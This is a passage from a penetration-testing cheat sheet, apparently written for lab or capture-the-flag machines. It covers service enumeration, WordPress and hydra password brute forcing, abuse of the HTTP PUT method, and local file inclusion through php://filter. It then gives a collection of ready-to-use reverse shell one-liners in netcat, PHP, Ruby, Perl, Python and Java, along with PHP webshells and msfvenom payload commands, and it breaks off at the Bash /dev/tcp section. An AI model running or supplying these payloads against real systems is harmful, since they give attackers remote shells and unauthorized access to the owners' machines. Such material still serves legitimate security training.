<span class="mi">10000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>        <span class="n">MiniServ</span> <span class="mf">0.01</span> <span class="p">(</span><span class="n">Webmin</span> <span class="n">httpd</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> <span class="n">No</span> <span class="n">Allow</span> <span class="ow">or</span> <span class="n">Public</span> <span class="n">header</span> <span class="ow">in</span> <span class="n">OPTIONS</span> <span class="n">response</span> <span class="p">(</span><span class="n">status</span> <span class="n">code</span> <span class="mi">200</span><span class="p">)</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesn</span><span class="s1">&#39;t have a title (text/html; Charset=iso-8859-1).</span>
<span class="o">|</span> <span class="n">ndmp</span><span class="o">-</span><span class="n">version</span><span class="p">:</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">ERROR</span><span class="p">:</span> <span class="n">Failed</span> <span class="n">to</span> <span class="n">get</span> <span class="n">host</span> <span class="n">information</span> <span class="kn">from</span> <span class="nn">server</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
</pre></div>
</div>
<p>If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~</span><span class="c1"># searchsploit webmin</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
<span class="n">Description</span>                                                                            <span class="n">Path</span>
<span class="o">----------------------------------------------------------------------------------------------------------------</span>
<span class="n">Webmin</span> <span class="o">&lt;</span> <span class="mf">1.290</span> <span class="o">/</span> <span class="n">Usermin</span> <span class="o">&lt;</span> <span class="mf">1.220</span> <span class="n">Arbitrary</span> <span class="n">File</span> <span class="n">Disclosure</span> <span class="n">Exploit</span>                   <span class="o">|</span> <span class="o">/</span><span class="n">multiple</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">1997.</span><span class="n">php</span>
<span class="n">Webmin</span> <span class="o">&lt;</span> <span class="mf">1.290</span> <span class="o">/</span> <span class="n">Usermin</span> <span class="o">&lt;</span> <span class="mf">1.220</span> <span class="n">Arbitrary</span> <span class="n">File</span> <span class="n">Disclosure</span> <span class="n">Exploit</span> <span class="p">(</span><span class="n">perl</span><span class="p">)</span>            <span class="o">|</span> <span class="o">/</span><span class="n">multiple</span><span class="o">/</span><span class="n">remote</span><span class="o">/</span><span class="mf">2017.</span><span class="n">pl</span>
<span class="n">Webmin</span> <span class="mf">1.</span><span class="n">x</span> <span class="n">HTML</span> <span class="n">Email</span> <span class="n">Command</span> <span class="n">Execution</span> <span class="n">Vulnerability</span>                                <span class="o">|</span> <span class="o">/</span><span class="n">cgi</span><span class="o">/</span><span class="n">webapps</span><span class="o">/</span><span class="mf">24574.</span><span class="n">txt</span>
<span class="o">**********</span><span class="n">Trimmed</span><span class="o">**************</span>
</pre></div>
</div>
<p>Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Need nmap -sV -x xmlfile ).</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">searchsploit</span>

     <span class="o">--</span><span class="n">nmap</span>     <span class="p">[</span><span class="n">file</span><span class="o">.</span><span class="n">xml</span><span class="p">]</span>  <span class="n">Checks</span> <span class="nb">all</span> <span class="n">results</span> <span class="ow">in</span> <span class="n">Nmap</span><span class="s1">&#39;s XML output with service version (e.g.: nmap -sV -oX file.xml).</span>
                            <span class="n">Use</span> <span class="s2">&quot;-v&quot;</span> <span class="p">(</span><span class="n">verbose</span><span class="p">)</span> <span class="n">to</span> <span class="k">try</span> <span class="n">even</span> <span class="n">more</span> <span class="n">combinations</span>
</pre></div>
</div>
</div>
<div class="section" id="seclists-org-security-mailing-list-archive">
<h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Permalink to this headline">¶</a></h3>
<p>There would be some days, when you won&#8217;t find vulnerability in searchsploit. We should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a>, if someone has reported any bug for that particular software.</p>
</div>
<div class="section" id="webservices">
<h3>Webservices<a class="headerlink" href="#webservices" title="Permalink to this headline">¶</a></h3>
<p>If a webserver is running on the machine, we can start with running</p>
<div class="section" id="whatweb">
<h4>whatweb<a class="headerlink" href="#whatweb" title="Permalink to this headline">¶</a></h4>
<p>Utilize whatweb to find what server is running. Further, we can execute nikto, w3af to find any vulnerabilities. dirb to find any hidden directories.</p>
</div>
<div class="section" id="put-method">
<h4>PUT Method<a class="headerlink" href="#put-method" title="Permalink to this headline">¶</a></h4>
<p>Sometimes, it is also a good option to check for the various OPTIONS available on the website such as GET, PUT, DELETE etc.</p>
<p>Curl command can be used to check the options available:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>curl -X OPTIONS -v http://192.168.126.129/test/
Trying 192.168.126.129…
Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
&gt; OPTIONS /test/ HTTP/1.1
&gt; Host: 192.168.126.129
&gt; User-Agent: curl/7.47.0
&gt; Accept: /
&gt;
&lt; HTTP/1.1 200 OK
&lt; DAV: 1,2
&lt; MS-Author-Via: DAV
&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
&lt; Allow: OPTIONS, GET, HEAD, POST
&lt; Content-Length: 0
&lt; Date: Fri, 29 Apr 2016 09:41:19 GMT
&lt; Server: lighttpd/1.4.28
&lt;
* Connection #0 to host 192.168.126.129 left intact
</pre></div>
</div>
<p>The put method allows you to upload a file. Eventually, you can upload a php file which can work as a shell. There are multiple methods to upload the file as mentioned in <a class="reference external" href="http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html">Detecting and exploiting the HTTP Put Method</a></p>
<p>The few are</p>
<ul class="simple">
<li>Nmap:</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span> <span class="o">--</span><span class="n">script</span> <span class="n">http</span><span class="o">-</span><span class="n">put</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">http</span><span class="o">-</span><span class="n">put</span><span class="o">.</span><span class="n">url</span><span class="o">=</span><span class="s1">&#39;/uploads/rootme.php&#39;</span><span class="p">,</span><span class="n">http</span><span class="o">-</span><span class="n">put</span><span class="o">.</span><span class="n">file</span><span class="o">=</span><span class="s1">&#39;/tmp/rootme.php&#39;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>curl:</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">--</span><span class="n">upload</span><span class="o">-</span><span class="n">file</span> <span class="n">test</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">v</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">126.129</span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">test</span><span class="o">.</span><span class="n">txt</span>
</pre></div>
</div>
<p>or</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">X</span> <span class="n">PUT</span> <span class="o">-</span><span class="n">d</span> <span class="s1">&#39;</span>
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="wordpress">
<h4>Wordpress<a class="headerlink" href="#wordpress" title="Permalink to this headline">¶</a></h4>
<p>When running wpscan, also make sure you run &#8211;enumerate u for enumerating usernames. By default wpscan doesn&#8217;t run it. Also, scan for plugins</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wpsscan</span>
  <span class="o">--</span><span class="n">url</span>       <span class="o">|</span> <span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">target</span> <span class="n">url</span><span class="o">&gt;</span>       <span class="n">The</span> <span class="n">WordPress</span> <span class="n">URL</span><span class="o">/</span><span class="n">domain</span> <span class="n">to</span> <span class="n">scan</span><span class="o">.</span>
  <span class="o">--</span><span class="n">force</span>     <span class="o">|</span> <span class="o">-</span><span class="n">f</span>                    <span class="n">Forces</span> <span class="n">WPScan</span> <span class="n">to</span> <span class="ow">not</span> <span class="n">check</span> <span class="k">if</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">site</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">WordPress</span><span class="o">.</span>
  <span class="o">--</span><span class="nb">enumerate</span> <span class="o">|</span> <span class="o">-</span><span class="n">e</span> <span class="p">[</span><span class="n">option</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span>        <span class="n">Enumeration</span><span class="o">.</span>
  <span class="n">option</span> <span class="p">:</span>
      <span class="n">u</span>        <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">1</span> <span class="n">to</span> <span class="mi">10</span>
      <span class="n">u</span><span class="p">[</span><span class="mi">10</span><span class="o">-</span><span class="mi">20</span><span class="p">]</span> <span class="n">usernames</span> <span class="kn">from</span> <span class="nn">id</span> <span class="mi">10</span> <span class="n">to</span> <span class="mi">20</span> <span class="p">(</span><span class="n">you</span> <span class="n">must</span> <span class="n">write</span> <span class="p">[]</span> <span class="n">chars</span><span class="p">)</span>
      <span class="n">p</span>        <span class="n">plugins</span>
      <span class="n">vp</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">plugins</span>
      <span class="n">ap</span>       <span class="nb">all</span> <span class="n">plugins</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
      <span class="n">tt</span>       <span class="n">timthumbs</span>
      <span class="n">t</span>        <span class="n">themes</span>
      <span class="n">vt</span>       <span class="n">only</span> <span class="n">vulnerable</span> <span class="n">themes</span>
      <span class="n">at</span>       <span class="nb">all</span> <span class="n">themes</span> <span class="p">(</span><span class="n">can</span> <span class="n">take</span> <span class="n">a</span> <span class="n">long</span> <span class="n">time</span><span class="p">)</span>
      <span class="n">Multiple</span> <span class="n">values</span> <span class="n">are</span> <span class="n">allowed</span> <span class="p">:</span> <span class="s2">&quot;-e tt,p&quot;</span> <span class="n">will</span> <span class="nb">enumerate</span> <span class="n">timthumbs</span> <span class="ow">and</span> <span class="n">plugins</span>
      <span class="n">If</span> <span class="n">no</span> <span class="n">option</span> <span class="ow">is</span> <span class="n">supplied</span><span class="p">,</span> <span class="n">the</span> <span class="n">default</span> <span class="ow">is</span> <span class="s2">&quot;vt,tt,u,vp&quot;</span>
</pre></div>
</div>
<p>Wordpress configuration is stored in wp-config.php. If you are able to download it, you might get username and password to database. We can also use wordpress to bruteforce password for a username</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">wpscan</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span> <span class="o">--</span><span class="n">wordlist</span> <span class="n">wordlist</span><span class="o">.</span><span class="n">txt</span> <span class="o">--</span><span class="n">username</span> <span class="n">example_username</span>
</pre></div>
</div>
</div>
<div class="section" id="names-possible-usernames-possible-passwords">
<h4>Names? Possible Usernames? Possible Passwords?<a class="headerlink" href="#names-possible-usernames-possible-passwords" title="Permalink to this headline">¶</a></h4>
<p>Sometimes, on visiting the webpage of the webserver (If Vulnerable machine is running any http/ https webserver), you would find possible  names of the employees working in the company. Now, it is common practice to have username based on your first/ last name. Superkojiman has written a script <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, we still have a large amount of  usernames to bruteforce with passwords. Further, if the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.</p>
<ul class="simple">
<li>Using metasploit smtp_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.</li>
<li>Using VRFY command:</li>
<li>Using RCPT TO command:</li>
</ul>
</div>
<div class="section" id="brute-forcing-hydra">
<h4>Brute forcing: hydra<a class="headerlink" href="#brute-forcing-hydra" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">l</span> <span class="n">LOGIN</span> <span class="ow">or</span> <span class="o">-</span><span class="n">L</span> <span class="n">FILE</span> <span class="n">login</span> <span class="k">with</span> <span class="n">LOGIN</span> <span class="n">name</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">logins</span> <span class="kn">from</span> <span class="nn">FILE</span>
<span class="o">-</span><span class="n">p</span> <span class="n">PASS</span>  <span class="ow">or</span> <span class="o">-</span><span class="n">P</span> <span class="n">FILE</span> <span class="k">try</span> <span class="n">password</span> <span class="n">PASS</span><span class="p">,</span> <span class="ow">or</span> <span class="n">load</span> <span class="n">several</span> <span class="n">passwords</span> <span class="kn">from</span> <span class="nn">FILE</span>
<span class="o">-</span><span class="n">U</span>        <span class="n">service</span> <span class="n">module</span> <span class="n">usage</span> <span class="n">details</span>
<span class="o">-</span><span class="n">e</span> <span class="n">nsr</span> <span class="n">additional</span> <span class="n">checks</span><span class="p">,</span> <span class="s2">&quot;n&quot;</span> <span class="k">for</span> <span class="n">null</span> <span class="n">password</span><span class="p">,</span> <span class="s2">&quot;s&quot;</span> <span class="k">try</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span> <span class="k">try</span> <span class="n">the</span> <span class="n">reverse</span> <span class="n">login</span> <span class="k">as</span> <span class="k">pass</span>
</pre></div>
</div>
<p>hydra http-post-form:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>hydra -U http-post-form

 Help for module http-post-form:
 ============================================================================
 Module http-post-form requires the page and the parameters for the web form.

 By default this module is configured to follow a maximum of 5 redirections in a row. It always gathers a new cookie from the same URL without variables. The parameters take three &quot;:&quot; separated values, plus optional values.

 (Note: if you need a colon in the option string as value, escape it with &quot;\:&quot;, but do not escape a &quot;\&quot; with &quot;\\&quot;.)

 Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
 First is the page on the server to GET or POST to (URL).
 Second is the POST/GET variables (taken from either the browser, proxy, etc.
 with usernames and passwords being replaced in the &quot;^USER^&quot; and &quot;^PASS^&quot; placeholders (FORM PARAMETERS)
 Third is the string that it checks for an *invalid* login (by default)
 Invalid condition login check can be preceded by &quot;F=&quot;, successful condition
 login check must be preceded by &quot;S=&quot;.
 This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
                     The following parameters are optional:
                     C=/page/uri     to define a different page to gather initial cookies from
                     (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                             ^USER^ and ^PASS^ can also be put into these headers!
                             Note: &#39;h&#39; will add the user-defined header at the end
                             regardless it&#39;s already being sent by Hydra or not.
                             &#39;H&#39; will replace the value of that header if it exists, by the
                              one supplied by the user, or add the header at the end
                     Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
                     All colons that are not option separators should be escaped (see the examples above and below).
                     You can specify a header without escaping the colons, but that way you will not be able to put colons
                     in the header value itself, as they will be interpreted by hydra as option separators.

                     Examples:
                     &quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;
                     &quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon\:escape:S=authlog=.*success&quot;
                     &quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.*failed&quot;
                     &quot;/:user=^USER&amp;pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^&quot;
                     &quot;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&quot;
</pre></div>
</div>
</div>
<div class="section" id="lfi-reading-a-php-file">
<h4>LFI : Reading a php file<a class="headerlink" href="#lfi-reading-a-php-file" title="Permalink to this headline">¶</a></h4>
<p>If a website is affected by a LFI, we could use php filter to read the source code of a PHP File</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
</pre></div>
</div>
<p>More information can be found at <a class="reference external" href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using PHP for file inclusion</a></p>
<p>To test LFI, RFI, we can also use <a class="reference external" href="http://tools.kali.org/web-applications/uniscan">Uniscan</a> Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">uniscan</span> <span class="o">-</span><span class="n">h</span>
<span class="n">OPTIONS</span><span class="p">:</span>
  <span class="o">-</span><span class="n">h</span>  <span class="n">help</span>
  <span class="o">-</span><span class="n">u</span>  <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span> <span class="n">example</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
  <span class="o">-</span><span class="n">f</span>  <span class="o">&lt;</span><span class="n">file</span><span class="o">&gt;</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">url</span><span class="s1">&#39;s</span>
  <span class="o">-</span><span class="n">b</span>  <span class="n">Uniscan</span> <span class="n">go</span> <span class="n">to</span> <span class="n">background</span>
  <span class="o">-</span><span class="n">q</span>  <span class="n">Enable</span> <span class="n">Directory</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">w</span>  <span class="n">Enable</span> <span class="n">File</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">e</span>  <span class="n">Enable</span> <span class="n">robots</span><span class="o">.</span><span class="n">txt</span> <span class="ow">and</span> <span class="n">sitemap</span><span class="o">.</span><span class="n">xml</span> <span class="n">check</span>
  <span class="o">-</span><span class="n">d</span>  <span class="n">Enable</span> <span class="n">Dynamic</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">s</span>  <span class="n">Enable</span> <span class="n">Static</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">r</span>  <span class="n">Enable</span> <span class="n">Stress</span> <span class="n">checks</span>
  <span class="o">-</span><span class="n">i</span>  <span class="o">&lt;</span><span class="n">dork</span><span class="o">&gt;</span> <span class="n">Bing</span> <span class="n">search</span>
  <span class="o">-</span><span class="n">o</span>  <span class="o">&lt;</span><span class="n">dork</span><span class="o">&gt;</span> <span class="n">Google</span> <span class="n">search</span>
  <span class="o">-</span><span class="n">g</span>  <span class="n">Web</span> <span class="n">fingerprint</span>
  <span class="o">-</span><span class="n">j</span>  <span class="n">Server</span> <span class="n">fingerprint</span>

<span class="n">usage</span><span class="p">:</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span> <span class="o">-</span><span class="n">qweds</span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">f</span> <span class="n">sites</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">bqweds</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">i</span> <span class="n">uniscan</span>
<span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">i</span> <span class="s2">&quot;ip:xxx.xxx.xxx.xxx&quot;</span>
<span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">o</span> <span class="s2">&quot;inurl:test&quot;</span>
<span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="n">perl</span> <span class="o">./</span><span class="n">uniscan</span><span class="o">.</span><span class="n">pl</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span><span class="o">/</span> <span class="o">-</span><span class="n">r</span>
</pre></div>
</div>
<p>There&#8217;s another tool called <a class="reference external" href="https://tools.kali.org/web-applications/fimap">fimap</a>. However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.</p>
<p>Also, if we have unprivileged user shell, however don&#8217;t have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.</p>
</div>
</div>
<div class="section" id="reverse-shells">
<h3>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permalink to this headline">¶</a></h3>
<p>Mostly taken from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and some more.</p>
<div class="section" id="netcat-nc">
<h4>netcat (nc)<a class="headerlink" href="#netcat-nc" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>with the -e option</li>
</ul>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">e</span> <span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="mi">1234</span>
</pre></div>
</div>
<ul class="simple">
<li>without -e option</li>
</ul>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rm</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">mkfifo</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="p">;</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span><span class="o">|/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span><span class="o">|</span><span class="n">nc</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="mi">1234</span> <span class="o">&gt;/</span><span class="n">tmp</span><span class="o">/</span><span class="n">f</span>
</pre></div>
</div>
</div>
<div class="section" id="php">
<h4>PHP<a class="headerlink" href="#php" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li><strong>PHP Shell</strong></li>
</ul>
<blockquote>
<div><p>We can create a new file say (shell.php) on the server containing</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>&lt;?php system($\_GET[&quot;cmd&quot;]); ?&gt;
</pre></div>
</div>
<p>or</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>&lt;?php echo shell_exec($\_GET[&quot;cmd&quot;]); ?&gt;
</pre></div>
</div>
<p>which can be accessed by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>http://IP/shell.php?cmd=id
</pre></div>
</div>
<p>or</p>
</div></blockquote>
<ul class="simple">
<li><strong>PHP Meterpreter</strong></li>
</ul>
<blockquote>
<div><p>We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">php</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.1</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">4444</span> <span class="o">-</span><span class="n">f</span> <span class="n">raw</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><strong>PHP Reverse Shell</strong></li>
</ul>
<blockquote>
<div><p>PHP Trick: This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">php</span> <span class="o">-</span><span class="n">r</span> <span class="s1">&#39;$sock=fsockopen(&quot;192.168.56.101&quot;,1337);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span>
</pre></div>
</div>
<p>The above can be connected by listening at port 1337 by using nc</p>
</div></blockquote>
</div>
<div class="section" id="weevely">
<h4>Weevely<a class="headerlink" href="#weevely" title="Permalink to this headline">¶</a></h4>
<p>Weevely also generates a webshell</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">weevely</span> <span class="n">generate</span> <span class="n">password</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">payload</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>which can be called by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">weevely</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span><span class="o">/</span><span class="n">location_of_payload</span> <span class="n">password</span>
</pre></div>
</div>
<p>However, it wasn&#8217;t as useful as php meterpreter or reverse shell.</p>
</div>
<div class="section" id="ruby">
<h4>Ruby<a class="headerlink" href="#ruby" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ruby</span> <span class="o">-</span><span class="n">rsocket</span> <span class="o">-</span><span class="n">e</span><span class="s1">&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;</span><span class="si">%d</span><span class="s1"> &gt;&amp;</span><span class="si">%d</span><span class="s1"> 2&gt;&amp;</span><span class="si">%d</span><span class="s1">&quot;,f,f,f)&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="perl">
<h4>Perl<a class="headerlink" href="#perl" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>perl -e <span class="s1">&#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="python">
<h4>Python<a class="headerlink" href="#python" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="java">
<h4>Java<a class="headerlink" href="#java" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">r</span> <span class="o">=</span> Runtime.getRuntime<span class="o">()</span>
<span class="nv">p</span> <span class="o">=</span> r.exec<span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span>,<span class="s2">&quot;-c&quot;</span>,<span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span> as String<span class="o">[])</span>
p.waitFor<span class="o">()</span>
</pre></div>
</div>
</div>
<div class="section" id="jsp">
<h4>JSP<a class="headerlink" href="#jsp" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span>msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.110.129 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f war &gt; runme.war
</pre></div>
</div>
</div>
<div class="section" id="bash-dev-tcp">
<h4>Bash /dev/tcp<a class="headerlink" href="#bash-dev-tcp" title="Permalink to this headline">¶</a></h4>
<p>If a server is listening on a port:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nc</span> <span class="o">-</span><span class="n">lvp</span> <span class="n">port</span>
</pre></div>
</div>
<p>then we can use the below to connect</p>
